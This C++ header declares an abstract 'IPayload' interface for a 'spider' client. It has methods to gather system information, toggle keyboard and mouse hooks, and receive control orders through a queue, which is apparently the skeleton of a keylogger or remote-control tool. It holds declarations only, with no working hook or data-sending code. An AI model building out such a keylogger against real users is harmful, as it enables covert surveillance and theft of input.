#pragma once

#include "SystemInfo.h"
#include "SystemMsg.h"
#include "Queue.h"

namespace spider
{
namespace client
{
namespace library
{
class IPayload
{
public:
  virtual ~IPayload() = default;

  // Should initialize the payload, if needed
  virtual bool init(mt::Queue<SystemMsg> &inputQueue) = 0;

  // Get the event thread-safe queue, in order to control the client
  virtual mt::Queue<SystemMsg> &getOrderQueue() = 0;

  // Should de-initialize the payload, if needed
  virtual bool deinit() = 0;

  // Collect informations about the system
  virtual SystemInfos const &getInfos() const = 0;

  // Toggle Keyboard hook
  virtual bool getKeyboard() = 0;

  // Toggle Mouse hook
  virtual bool getMouse() = 0;

  // Execute all the actions needed
  virtual void run() = 0;
};
}
}
}